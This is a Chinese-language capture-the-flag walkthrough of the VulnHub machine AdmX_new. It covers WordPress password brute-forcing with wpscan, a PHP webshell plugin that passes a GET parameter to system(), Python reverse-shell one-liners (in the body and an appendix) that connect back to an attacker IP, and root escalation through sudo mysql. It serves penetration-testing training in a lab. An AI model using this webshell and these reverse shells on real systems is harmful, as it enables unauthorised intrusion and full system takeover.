## 第四周

**靶机名称**:vulnhub---**AdmX_new**

**靶机链接**:[AdmX_new](https://download.vulnhub.com/admx/AdmX_new.7z)

**难度**:*Medium*

**攻击机**:Kali Linux

**使用工具**:[feroxbuster](https://github.com/epi052/feroxbuster)

**强烈推荐教程**:[我们一起来打靶](https://pqy.h5.xeknow.com/s/2svbaU)

![推广](https://tva1.sinaimg.cn/large/008i3skNly1gtez9sj6vrj60u01hdgsv02.jpg)

### 主机发现

今天的主机发现没有新工具,而是我们的老朋友——`nmap`

众所周知,nmap是一款非常强大的扫描工具,不只能扫描端口,还能进行主机发现呢!

`sudo nmap -sn 10.0.0.0/24`

`-sn`的意思是使用ping扫描,后面指定了网段`10.0.0.0`,其CIDR为24

![截屏2021-08-24 下午7.04.20](https://tva1.sinaimg.cn/large/008i3skNgy1gts32p87eaj60u60r6agv02.jpg)

可以看到,在每台主机的mac地址后面标出了主机的类型,我们找到Virtualbox这一条,获得靶机ip~

`10.0.0.31`

### 端口扫描

接下来使用nmap进行全端口扫描,不能放过任何一个端口!!

`sudo nmap -p- 10.0.0.31`

![截屏2021-08-24 下午7.18.48](https://tva1.sinaimg.cn/large/008i3skNgy1gts3hnalhpj60su0aemz702.jpg)

咦?只发现了一个80端口

接下来我们进行服务版本扫描

`sudo nmap -p80 -sV 10.0.0.31`

![截屏2021-08-24 下午7.20.02](https://tva1.sinaimg.cn/large/008i3skNly1gts3ix2c8sj61700aun0102.jpg)

发现是`apache2.4.41`的web服务

我们去浏览器看看吧~

### Web页面

![截屏2021-08-24 下午7.57.22](https://tva1.sinaimg.cn/large/008i3skNly1gts4lu8x5uj61140u0dnx02.jpg)

是apache的默认页面

会想起之前的打靶过程.面对一个web界面,我们要不去寻找其功能点上的漏洞,要么就去爆破目录,寻找隐藏的目录.

在之前,我们使用了`dirsearch`爆破目录.这次我们介绍一个新工具——`feroxbuster`

在kali中需要先进行安装fexroxbuster:`sudo apt install feroxbuster`

再安装默认使用的字典seclists:`sudo apt install seclists`

此处seclists字典的安装时间可能过长,我们也可以使用-w参数指定字典

`sudo feroxbuster --url http://10.0.0.31 -w /usr/share/dirb/wordlists/common.txt`

![截屏2021-08-25 上午9.52.29](https://tva1.sinaimg.cn/large/008i3skNgy1gtssqre6tij61090u0tfy02.jpg)

完整结果很长,但是我们看到了一些有趣的东西.当我们访问`/wordpress`目录时,它返回了301重定向相应码

其中在访问`wordpress/admin`与`wordpress/dashboard`时返回了302

#### 简陋的响应页面?

我们访问一下`wordpress`页面![截屏2021-08-25 上午9.58.26](https://tva1.sinaimg.cn/large/008i3skNgy1gtsswxll8tj61090u0djv02.jpg)

可以看出来,这是一个`Sample wordpress`服务器.但是,奇怪的事情发生了.

为什么我们只是访问一个简单的页面,却加载了1~2分钟?而且页面内容都没有渲染呢?

到底是什么原因?

我们打开burpsuite进行代理分析,看看我们访问了哪些资源

![截屏2021-08-25 上午10.11.03](https://tva1.sinaimg.cn/large/008i3skNly1gtsta2bm9cj61090u0wjd02.jpg)

嗯???怎么多了一个奇怪的ip地址

打开相应包一看,原来服务器把其他资源的地址硬编码在了相应文件中,这可咋整?

别怕,我们有强大的burpsuite.点击`Proxy`--->`Options`,拉到下面,`Match and Replace`中,添加两条

![截屏2021-08-25 上午10.13.55](https://tva1.sinaimg.cn/large/008i3skNly1gtstd27re2j60tc0fwjss02.jpg)

![截屏2021-08-25 上午10.14.24](https://tva1.sinaimg.cn/large/008i3skNly1gtstdjg3g0j60to0gowfs02.jpg)

分别添加`Response header`和`Response body`,将`192.168.159.145`替换为`10.0.0.31`

burp默认会启用我们新添加的匹配表达式,现在重新用浏览器请求试试?

![截屏2021-08-25 上午10.17.51](https://tva1.sinaimg.cn/large/008i3skNly1gtsth5g4h0j61090u0n0402.jpg)

害,这才是正常的样子吗~~

#### 找呀找呀找漏洞~

![截屏2021-08-25 上午10.20.30](https://tva1.sinaimg.cn/large/008i3skNgy1gtstjw1uyxj612s0lkn2f02.jpg)

我们对之前的相应包进行搜索,找到了wordpress的版本——5.7.1

使用wpscan进行扫描,发现了一个Object Injection漏洞,但是经过一顿谷歌,没有找到exp...

emmm..我们换条路吧

#### 	哟~~登陆密码?

我们想起wordpress的默认管理页面是`wp-admin`,我们访问一下看看

![截屏2021-08-25 上午11.23.16](https://tva1.sinaimg.cn/large/008i3skNgy1gtsvd6fwnkj61090u0tb902.jpg)

重定向到了登录页面.我们尝试使用admin/admin弱密码登录试试![截屏2021-08-25 上午11.24.16](https://tva1.sinaimg.cn/large/008i3skNgy1gtsve77b1hj60ks08cgm302.jpg)

看来我们的用户名确实是admin,但是密码错误了.

那就爆破吧!

<u>*ps:一开始我使用了burp+seclists字典进行爆破,奈何community版本爆破太慢!且正确密码在第70000个左右,只好转战wpscan这款专业的wordpress工具,同时使用rockyou.txt进行爆破,正确密码大概在第30000个左右.*</u>

**<u>我在这里友好地提示各位,如果没必要的话,直接用下面我爆破出来的密码就行,不用自己尝试了,太耗时间.不过如果你用的是burp专业版,且使用rockyou.txt的话可以自行尝试,大概在5~10分钟左右能出结果</u>**

使用kali自带的rockyou.txt密码字典文件,结合wpsan自带的密码爆破功能,进行尝试

`wpscan --url http://10.0.0.31/wordpress/ --login-uri http://10.0.0.31/wordpress/wp-login.php -U 'admin' -P ~/tools/dict/rockyou.txt`

![截屏2021-08-25 下午3.10.18](https://tva1.sinaimg.cn/large/008i3skNly1gtt1xjbw07j61d00eo0w002.jpg)

我的天啊,等待了近乎三个小时,终于把密码爆破了出来——`adam14`

我们现在尝试登陆吧~![截屏2021-08-25 下午3.11.53](https://tva1.sinaimg.cn/large/008i3skNly1gtt1z3x8vqj61090u0jwh02.jpg)

这下我们就来到了wordpress的管理界面

### 快把shell给我!

一般来说,我们有四种方式获得shell

#### 1.Media->Add New上传shell文件.

很可惜,仅在某些有漏洞的版本有效.此处无法使用此漏洞![截屏2021-08-25 下午3.12.57](https://tva1.sinaimg.cn/large/008i3skNly1gtt206noytj61090u0q6r02.jpg)

#### 2.修改主题,嵌入代码

点击Appearance->Theme Editor

通常来说,我们会选择404.php进行修改,插入一条php一句话,从而获取shell![截屏2021-08-25 下午3.33.35](https://tva1.sinaimg.cn/large/008i3skNgy1gtt2lpqabjj61090u0jx102.jpg)

很可惜,此处不能直接进行修改,可能是有什么限制...

#### 3.增加插件,上传插件

我们可以自己写一个恶意的插件,然后增加到服务器中.这样就可以执行任意代码啦

要注意,插件的编写需要一定格式.

```php
<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/busizhiya/
Description: Wordpress Webshell for Pentest
Version: 1.0
Author: bszy
Author URI: https://github.com/busizhiya/
License: https://github.com/busizhiya/
*/
if(isset($_GET['qaq']))
	{
  	system($_GET['qaq']);
	}
?>
```

`Plugins->Add New->Upload Plugin`

注意,插件需要打包为zip方可上传安装

![截屏2021-08-25 下午4.02.04](https://tva1.sinaimg.cn/large/008i3skNgy1gtt3faqy82j61090u0jv602.jpg)

记得要点击一下激活插件哦

安装后的插件会被储存在wp-content/plugins下

我们访问一下`http://10.0.0.31/wordpress/wp-content/plugins/wp-plugin-shell.php?qaq=id`

![截屏2021-08-25 下午4.51.35](https://tva1.sinaimg.cn/large/008i3skNly1gtt4urtxgxj61090u0adg02.jpg)

成功啦!

接下来我们使用which命令看看有哪些命令是可用的

这里有个小坑,我们可以使用`which nc`成功发现nc

使用`which python`找不到,使用`which python2`找不到.

最后使用`which python3`,找到啦!所以一定要选择注意版本,多尝试!

之前我们已经用过很多次串联nc了,我们这次再换个口味,用python

`http://10.0.0.31/wordpress/wp-content/plugins/wp-plugin-shell.php?qaq=python3%20-c%20%22import%20socket,os;RHOST=%2710.0.0.12%27;RPORT=4444;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((RHOST,RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('/bin/bash')"`

![截屏2021-08-25 下午5.45.59](https://tva1.sinaimg.cn/large/008i3skNgy1gtt6fel91zj61090u0n1o02.jpg)

#### 4.msf获取shell

首先打开msfconsole,搜索并使用`exploit/unix/webapp/wp_admin_shell_upload`

设置相应参数,run即可获得反弹meterpreter.

我们尝试编辑之前的404.php文件

![截屏2021-08-25 下午8.49.50](https://tva1.sinaimg.cn/large/008i3skNgy1gttbqqyknej61090u0q6h02.jpg)

使用vi时遇到了困难,怎么不能使用方向键!

我们需要先升级Full TTY Shell

注意.此升级方案只适用于bash.

如果你使用的也是Kali Linux,那么在此之前,可能需要先把zsh切换为bash.

输入`echo $SHELL`查看当前shell类型,如果为bash,则可直接升级,如果为其他类型的shell,先执行下面的命令以切换shell.

`chsh -s /bin/bash`然后重启

1.输入Ctrl+Z

2.输入`stty raw -echo`

3.输入`fg`

4.输入`export SHELL=/bin/bash`

5.输入`export TERM=screen`

6.输入`stty rows 38 columns 126`

7.输入`reset`

在这之后,我们就有了一个功能完整的shell了,这个shell是可交互的!功能相当完整.输入Ctrl+C也不会一下子断开链接啦!甚至可以使用上下键回滚指令,使用tab键补齐呢!

#### 上线多个shell

获得了一个shell就足够了吗?

在真实的渗透环境中,我们往往会遇到很多不确定因素.比如一个漏洞只有在第一次触发的时候有效,再次触发就无效了!再比如因为网络原因,某个shell突然就掉了.

因此,我们常常先上线一个shell,然后一定把这个小shell稳固下来,比如上线蚁剑、升级为Full tty等等

在这里,我们就修改之前404的模版上线第二个shell.

通过wp-admin的dashboard页面,我们可以发现wordpress的主题为twentytwentyone

我们现在进入目录wp-content/themes/twentytwentyone,找到404.php,使用vi进行编辑

![截屏2021-08-26 下午4.00.52](https://tva1.sinaimg.cn/large/008i3skNgy1gtu90craw5j61140u0djc02.jpg)

现在我们尝试使用蚁剑链接webshell.

![截屏2021-08-26 下午4.14.45](https://tva1.sinaimg.cn/large/008i3skNgy1gtu9eta33kj61140u0whu02.jpg)

上线成功!

### 提权

#### 四处康康

接下来我们就进入到shell中四处康康~

首先查看有哪些用户![截屏2021-08-26 下午5.32.47](https://tva1.sinaimg.cn/large/008i3skNgy1gtubnzt17bj612g0u0ao202.jpg)

`cat /etc/passwd`

看来只有wpadmin这一个用户.

我们再看看/home路径![截屏2021-08-26 下午5.33.36](https://tva1.sinaimg.cn/large/008i3skNgy1gtubosmdetj60qa052q4a02.jpg)

果然只有一个用户.我们看看家目录下有什么~

![截屏2021-08-26 下午5.34.18](https://tva1.sinaimg.cn/large/008i3skNgy1gtubpivkagj60xm08ydij02.jpg)

居然是local.txt!!可惜只有wpadmin用户本人才可以进行读写.看来我们需要进行提权了!!

#### 普通用户

常规的`uname -a`发现内核版本很强大`sudo -l`需要密码,也没看到suid文件.

这时候,我想起了wordpress框架的配置文件,里面可能有相应的数据库连接密码

![截屏2021-08-26 下午5.30.30](https://tva1.sinaimg.cn/large/008i3skNgy1gtubllg8awj619k0m8tga02.jpg)

可以看到用户名为`admin`、密码为`Wp_Admin#123`

我们尝试登陆~

`mysql -uadmin -pWp_Admin#123`

成功了?!

我们进入数据库一顿翻找,发现了加密的用户密码![截屏2021-08-26 下午5.46.29](https://tva1.sinaimg.cn/large/008i3skNgy1gtuc29umkej61jc0batbh02.jpg)

emm...看来是之前的爆破出来的`adam14`

再换种姿势,既然我们手中已经有两个密码`adam14`、`Wp_Admin#123`,我们不妨试试能不能通过**密码重用**撞上wpadmin用户的密码呢~

`su wpadmin`,分别尝试两个密码.

成功了!wpadmin的密码就是`adam14`!!

这下我们就获得了普通用户权限的shell.

在实战中,有时候内网的多台主机密码可能相似或根本一样,一定要学会详细收集渗透中的信息并利用好信息.![截屏2021-08-26 下午6.06.22](https://tva1.sinaimg.cn/large/008i3skNgy1gtucmzs6u7j60ii040q3e02.jpg)

local.txt:`153495edec1b606c24947b1335998bd9`

#### 那是root吗?		不,那是数据库

获得了wpadmin权限,我们成功获得local.txt,接下来就要想办法进行进一步的提权,获取root权限.

我们还是用老办法,`sudo -l`,查看有哪些可以sudo执行的命令![截屏2021-08-26 下午5.59.11](https://tva1.sinaimg.cn/large/008i3skNgy1gtucffsvkxj61h806cacg02.jpg)

快看!是数据库!

我们可以使用sudo权限登陆数据库!但是仍然需要数据库密码...

不管啦!先试试吧~

`sudo /usr/bin/mysql -u root -D wordpress -p`

密码....`adam14`再试试吧!

成功啦!

再试试`Wp_Admin#123`?

也成功了?

再试试空密码?

也成功了?!!

看来这个密码是个幌子!

![截屏2021-08-26 下午6.02.52](https://tva1.sinaimg.cn/large/008i3skNly1gtucj8uyupj610c0cs77y02.jpg)

接下来要怎么执行shell指令呢?

别慌,mysql命令行有一个指令,`system`

我们可以用`system id;`或`\! id;`执行指令!

![截屏2021-08-26 下午6.04.16](https://tva1.sinaimg.cn/large/008i3skNly1gtuckpd5nkj60j404875102.jpg)

由于我们刚才使用的是sudo运行的程序,所以当前的权限就是root.我们尝试运行`bash`

`\! bash;`

![截屏2021-08-26 下午6.05.21](https://tva1.sinaimg.cn/large/008i3skNly1gtucltjuqjj60j2086ta202.jpg)

**\~\~PWN\~\~**

成功啦!

接下来就可以快乐的读flag啦~

proof.txt:`7efd721c8bfff2937c66235f2d0dbac1`

### 总结

这一次的打靶总体难度不大,但是我们对wordpress框架有了更加深刻的认识.

对于一开始的主机发现,nmap也不失为一个好工具.

常规的端口服务发现只找到了80?没关系,那就好好探索web页面

web页面居然是默认页面,空空如也?没关系,那就进行目录爆破,找路径!

这次我们尝试了新的目录爆破工具——`feroxbuster`.工具的原理都差不多,但是可以取长补短.

在发现了wordpress首页后,我们发现页面加载速度极慢!使用burpsuite抓包分析后才发现资源的ip地址被硬编码指定在响应头和响应主体中.于是我们使用burp强大的自动替换功能,将其硬编码的内容转换为靶机的ip,从而正确加载并渲染页面

发现cms为wordpress后,我们可以直接找到他的登陆点,wp-login.经过简单的分析后,我们发现admin为有效用户,然后使用burp对admin账户的密码进行爆破后发现community版本的爆破速度太慢了!于是我们使用wpscan对wordpress专门进行密码爆破.

当然,指定不同的字典,会获得不一样的结果.

在seclists的字典中,密码`adam14`大概在第70000个左右,使用kali自带的rockyou.txt居然在30000左右.看来kali的字典还是很强大啊!!

通过爆破,我们进入了wordpress的后台.我们尝试了四种反弹shell的方式,最终只有msf和增加插件的方式成功了.

有的同学很疑惑,我们有必要获取这么多shell吗?有的!很多时候shell的触发条件很苛刻,而且不确定因素很多.最好给自己留条后路,多做准备.

我们升级了Full TTY帮助我们更好的进行操作,编辑404.php文件获得蚁剑shell.

获得了多个shell后,我们心中自信满满.在进行简单的信息收集后,我们通过wp-config.php文件获得数据库的密码与数据库名称.但是很可惜,数据库中并没有对我们有帮助的东西.

接下来,我们要进行密码重用的尝试,居然神奇的登陆了wpadmin用户!获得local-flag

通过`sudo -`,我们发现可以sudo使用mysql,于是我们成功以root权限登陆了mysql命令行.

通过指令`system bash;`,我们成功获得root权限的shell~

### 附录

#### 	提升Full stty

1. CTRL+Z

2. stty raw -echo
3. fg
4. ls
5. export SHELL=/bin/bash
6. export TERM=screen
7. stty rows 38 columns 116
8. reset



#### python反弹shell

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

